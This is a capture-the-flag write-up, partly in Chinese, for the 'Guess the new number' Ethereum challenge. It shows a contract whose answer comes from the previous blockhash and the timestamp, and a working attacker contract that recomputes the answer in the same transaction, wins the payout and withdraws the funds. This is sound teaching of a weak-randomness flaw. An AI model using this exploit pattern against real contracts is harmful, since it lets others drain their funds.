The number is now generated on-demand when a guess is made.

```solidity
pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
```









这道题就和之前的一样了，本质就是attack中的block.number和guess中的block.number是同一个number

```solidity
pragma solidity ^0.8.0;

interface GuessTheNewNumberChallenge {
    function guess(uint8 n) external payable;
}

contract Attacker {
    address public owner;

    constructor(){
        owner = msg.sender;
    }

    function attack(address _addr) external payable{
        bytes memory ans = abi.encodePacked(blockhash(block.number - 1), block.timestamp);
        uint8 answer = uint8(uint256(keccak256(ans)));

        GuessTheNewNumberChallenge(_addr)
            .guess{value: 1 ether}(answer);
    }

    function withdraw() external {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}
```

